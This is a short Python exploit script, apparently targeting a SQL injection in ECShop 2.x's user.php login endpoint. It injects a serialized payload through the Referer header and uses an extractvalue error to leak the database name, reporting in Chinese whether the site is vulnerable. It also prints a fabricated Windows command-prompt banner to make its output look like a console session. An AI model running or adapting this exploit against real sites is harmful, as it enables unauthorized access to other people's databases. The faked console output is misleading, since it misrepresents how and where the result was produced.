#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/user.php?act=login"
    burp0_headers = {
    "Content-Type": "application/x-www-form-urlencoded", 
    "Referer": '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1)-- -";s:2:"id";i:1;}', 
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
    }
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    #print(r.text)
    if "XPATH" in r.text:
        info = re.findall("'~([^']+)'", r.text)
        if len(info) != 0:
            return info[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 ecshop-2x-sql-inject.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行payload extractvalue(rand(),concat(0x7e,database()))  结果为：", info)
    else:
        print("[-]漏洞不存在")
